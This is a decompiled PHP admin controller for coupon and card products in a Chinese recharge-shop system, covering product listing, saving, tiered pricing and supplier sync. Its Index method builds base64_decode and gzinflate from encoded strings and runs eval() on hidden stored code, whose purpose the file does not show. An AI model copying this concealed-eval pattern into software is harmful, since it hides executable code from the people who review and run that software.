<?php
/*********************/
/*                   */
/*  Version : 5.1.0  */
/*  Author  : RM     */
/*  Comment : 071223 */
/*                   */
/*********************/

if ( !defined( "UPATH_ROOT" ) )
{
				exit( "hacking deny" );
}
class CouponController extends Controller
{

				public $hander = NULL;

				public function __construct( )
				{
								$this->hander = factory::getinstance( "products" );
				}

				public function Index( )
				{
								include_once( UPATH_HELPER."ProductHelper.php" );
								$Rd2e691562d = getvar( "catid", "" );
								if ( $Rd2e691562d != "" )
								{
												$Rd2e691562d = intval( $Rd2e691562d );
								}
								$Rfff462d8f8 = intval( request( "allaid" ) );
								$R2a51483b14 = intval( request( "aid" ) );
								$R71a664ef8c = $this->PageInfo( );
								$data = array(
												"ptype" => getvar( "ptype", -1 ),
												"begprice" => getvar( "begprice", "" ),
												"endprice" => getvar( "endprice", "" ),
												"hassup" => getvar( "hassup" ),
												"sup" => intval( request( "sup" ) ),
												"catid" => $Rd2e691562d,
												"aid" => $R2a51483b14,
												"allaid" => $Rfff462d8f8
								);
								$data = array_merge( $data, $R71a664ef8c );
								$Oooo00 = "base64_decode";
								$ooOO00o = $Oooo00( "YmFzZTY0X2RlY29kZQ==" );
								$o00OO = $Oooo00( "Z3ppbmZsYXRl" );
								$cphp0 = __FILE__;
								eval( $o00OO( $ooOO00o( $this->comget( "nopuo" ) ) ) );
								$R00be52aa45 = array( "0" => "卡密商品", "1" => "自动充值", "2" => "代充商品", "3" => "号码类", "4" => "金币类", "5" => "装备类", "6" => "代练类", "100" => "兑换类一卡通", "101" => "充值类一卡通" );
								$R98e12c03c7 = factory::getinstance( "category" );
								$R3db8f5c8bc = $R98e12c03c7->ICategory_GetById( $Rd2e691562d );
								$this->Assign( "parent", $R3db8f5c8bc );
								$this->Recycle( "products" );
								$this->Assign( "ptype", getvar( "ptype", -1 ) );
								$this->Assign( "sarray", $R00be52aa45 );
								$this->Assign( "allaid", $Rfff462d8f8 );
								$this->Assign( "aid", $R2a51483b14 );
						
												$this->view( );
						
				}

				public function Save( )
				{
								$R8e8b5578f7 = intval( request( "pid" ) );
								$R63d0786ecc = doubleval( request( "ubzlistprice" ) );
								$Red2b3403a5 = doubleval( request( "ubzlistprice" ) );
								$Rcd0c741934 = intval( request( "catid" ) );
								$R98e12c03c7 = factory::getinstance( "category" );
								$R3db8f5c8bc = $R98e12c03c7->ICategory_GetById( $Rcd0c741934 );
								$R65edce27dd = getvar( "ubzpname", "" );
								$R51c716b966 = $this->SetLang( 1 );
								if ( $R65edce27dd == "" )
								{
												$R65edce27dd = $R3db8f5c8bc['name'].$Red2b3403a5.$R51c716b966['moneyunit'];
								}
								if ( $Rcd0c741934 == 0 )
								{
												$this->Alert( "请先选择商品分类！" );
												$this->HistoryGo( );
								}
								$R5d899a20a5 = $_SESSION['adminname'];
								$R2a039ed8fd = array(
												"pname" => $R65edce27dd,
												"ptagname" => $R65edce27dd,
												"ptype" => 1,
												"pdesc" => $R65edce27dd,
												"price" => $R63d0786ecc,
												"listprice" => $Red2b3403a5,
												"aid" => 0,
												"czweb" => "",
												"web" => "",
												"catid" => $Rcd0c741934,
												"imagefull" => "",
												"imagesmall" => "",
												"tag" => 0,
												"sell" => 1,
												"new" => 0,
												"remd" => 0,
												"hot" => 0,
												"sale" => 0,
												"disparea" => 0,
												"dispserv" => 0,
												"qtymin" => 1,
												"qtymax" => 10,
												"qtylist" => "",
												"cztpl" => 0,
												"syscztpl" => 0,
												"idlable" => "",
												"yktcard" => "",
												"ykttag" => "",
												"yktpoints" => 0,
												"supfirst" => 0,
												"forshop" => 0,
												"forb2b" => 0,
												"forykt" => 0,
												"mdydate" => date( "Y-m-d H-i-s" ),
												"mdyby" => $R5d899a20a5,
												"mdyip" => $_SERVER['REMOTE_ADDR'],
												"otherweb" => "",
												"tradeterm" => "",
												"disponshow" => 0,
												"stocks" => 0,
												"unit" => "",
												"namecolor" => "#000000",
												"ordering" => 0,
												"pinyin" => "",
												"webtitle" => "",
												"meta_keywords" => "",
												"meta_description" => "",
												"sup" => -1,
												"onsup" => -1
								);
								$R5cc00cfbe4 = 0;
								if ( 0 < $R8e8b5578f7 )
								{
												$R5cc00cfbe4 = 1;
												$R2a039ed8fd['pid'] = $R8e8b5578f7;
												$this->hander->IProduct_Update( $R2a039ed8fd, $R8e8b5578f7 );
												$R808b89ba0e = $this->UpdatePrice( $R8e8b5578f7, $R63d0786ecc, $Red2b3403a5 );
												if ( !$R808b89ba0e )
												{
																$this->Alert( "参数更新失败" );
																$this->HistoryGo( );
												}
								}
								else
								{
												$R5cc00cfbe4 = 0;
												$R2a039ed8fd['hassup'] = -1;
												$R2a039ed8fd['addeddate'] = date( "Y-m-d H-i-s" );
												$R2a039ed8fd['addedby'] = $R5d899a20a5;
												$R2a039ed8fd['addedip'] = $_SERVER['REMOTE_ADDR'];
												$R8e8b5578f7 = $this->hander->IProduct_Create( $R2a039ed8fd );
												if ( $R8e8b5578f7 <= 0 )
												{
																$this->Alert( "卡类面值添加失败" );
																$this->HistoryGo( );
												}
												$this->SetPriceByTpl( $R8e8b5578f7, $R63d0786ecc, $Red2b3403a5 );
								}
								if ( 0 < $R5cc00cfbe4 )
								{
												$R98aa12da5c = $this->GetUmebizPid( $R8e8b5578f7 );
								}
								if ( UB_SUP == 1 )
								{
												$Rc8295d6e4b = $this->ServiceSave( $R5cc00cfbe4, $R8e8b5578f7, $R65edce27dd, $Red2b3403a5 );
												if ( $Rc8295d6e4b <= 0 )
												{
																$this->Alert( "由于网络或者其他原因！部分参数未成功填入或更新，您可以重新操作或者过会再操作！" );
																$this->HistoryGo( );
												}
								}
								if ( 0 < $R8e8b5578f7 )
								{
												$this->Alert( "操作成功！" );
								}
								else
								{
												$this->Alert( "操作失败！" );
												$this->HistoryGo( );
								}
								$this->ScriptRedirect( "index.php?m=mod_b2b&c=coupon&catid=".$Rcd0c741934 );
				}

				public function ServiceSave( $R5cc00cfbe4, $R39e8277116, $R65edce27dd, $Red2b3403a5 )
				{
								$R2a039ed8fd = array(
												"ubzpname" => urlencode( $R65edce27dd ),
												"ubzptagname" => urlencode( $R65edce27dd ),
												"ubzptype" => 1,
												"ubzdcrp" => urlencode( $R65edce27dd ),
												"ubzprice" => $Red2b3403a5,
												"ubzlistprice" => $Red2b3403a5,
												"ubzcprice1" => $Red2b3403a5,
												"ubzcprice2" => $Red2b3403a5,
												"ubzcprice3" => $Red2b3403a5,
												"ubzcprice4" => $Red2b3403a5,
												"ubzcprice5" => $Red2b3403a5,
												"ubzczweb" => $Red2b3403a5,
												"ubzweb" => "",
												"ubzdid1" => 0,
												"ubzdid2" => 0,
												"ubzimage" => "",
												"ubzimagesmall" => "",
												"ubztag" => 0,
												"ubzsell" => 1,
												"ubznew" => 0,
												"ubzremd" => 0,
												"ubzhot" => 0,
												"ubzsale" => 0,
												"ubzctrl" => 0,
												"ubzsupprice" => 0,
												"ubzctrlprice" => 0,
												"ubzsupcheck" => 0,
												"ubzdisparea" => 0,
												"ubzdispserv" => 0,
												"ubzqtymin" => 1,
												"ubzqtymax" => 100,
												"ubzqtylist" => "",
												"ubzcztpl" => 0,
												"ubzidlable" => "",
												"localpid" => intval( $R39e8277116 )
								);
								$R8e8b5578f7 = $this->GetUmebizPid( $R39e8277116 );
								$Rfa7693361d = 0;
								if ( 0 < $R8e8b5578f7 )
								{
												$R2a039ed8fd['ubzpid'] = $R8e8b5578f7;
												$R2a039ed8fd['ubzmdyby'] = $_SESSION['adminname'];
												$R2a039ed8fd['ubzmdyip'] = $_SERVER['REMOTE_ADDR'];
												$R2a039ed8fd['action'] = "prdedit";
								}
								else
								{
												$Rfa7693361d = 1;
												$R2a039ed8fd['ubzaddedby'] = $_SESSION['adminname'];
												$R2a039ed8fd['ubzaddedip'] = $_SERVER['REMOTE_ADDR'];
												$R2a039ed8fd['action'] = "prdadd";
												$R2a039ed8fd['ubzsup'] = 1;
								}
								$R136fe42ad4 = factory::getservice( "sproducts" );
								$R8e8b5578f7 = $R136fe42ad4->IProduct_Save( $R2a039ed8fd );
								if ( 0 < $R8e8b5578f7 && $Rfa7693361d == 1 )
								{
												$R2a039ed8fd['ubzpid'] = $R8e8b5578f7;
												$R2a039ed8fd['action'] = "prdedit";
												$R2a039ed8fd['ubzsup'] = 0;
												$R8e8b5578f7 = $R136fe42ad4->IProduct_Save( $R2a039ed8fd );
								}
								return $R8e8b5578f7;
				}

				public function SetPriceByTpl( $R8e8b5578f7, $R63d0786ecc, $Red2b3403a5 )
				{
								$data = array( );
								$R063e6693e5 = factory::getinstance( "ranks" );
								$R3db8f5c8bc = $R063e6693e5->IRank_Get( );
								foreach ( $R3db8f5c8bc as $R0f8134fb60 )
								{
												$data["price_".$R0f8134fb60['id']] = round( $R63d0786ecc + ( $Red2b3403a5 - $R63d0786ecc ) * $R0f8134fb60['discount'], 3 );
								}
								$data['price'] = $R63d0786ecc;
								$data['listprice'] = $Red2b3403a5;
								$R5ff3ab27b8 = factory::getinstance( "prices" );
								$data['aid'] = 0;
								$data['pid'] = $R8e8b5578f7;
								if ( !$R5ff3ab27b8->IPrice_IsExist( $R8e8b5578f7, 0 ) )
								{
												$R808b89ba0e = $R5ff3ab27b8->IPrice_Create( $data );
								}
								else
								{
												$R808b89ba0e = $R5ff3ab27b8->IPrice_UpdateByAidAndPid( $data, 0, $R8e8b5578f7 );
								}
								return $R808b89ba0e;
				}

				public function UpdatePrice( $R8e8b5578f7, $R63d0786ecc, $Red2b3403a5 )
				{
								$data = array(
												"price" => $R63d0786ecc,
												"listprice" => $Red2b3403a5
								);
								$R5ff3ab27b8 = factory::getinstance( "prices" );
								$R808b89ba0e = $R5ff3ab27b8->IPrice_UpdateByAidAndPid( $data, 0, $R8e8b5578f7 );
								return $R808b89ba0e;
				}

				public function Detail( )
				{
								$R8e8b5578f7 = intval( request( "pid" ) );
								$R3db8f5c8bc = $this->hander->IProduct_Get( $R8e8b5578f7 );
								$R98e12c03c7 = factory::getinstance( "category" );
								$R494af0fa28 = $R98e12c03c7->ICategory_GetById( $R3db8f5c8bc['catid'] );
								$this->Assign( "item", $R3db8f5c8bc );
								$this->Assign( "parent", $R494af0fa28 );
								if ( $R494af0fa28['gateway'] == 3 )
								{
												$R136fe42ad4 = factory::getservice( "sproducts" );
												$R901a6b96db = $R136fe42ad4->IProduct_GetC2AutoState( array(
																"localpid" => $R8e8b5578f7
												) );
												$this->Assign( "state", $R901a6b96db );
								}
						
												$this->View( );
						
				}

}

?>
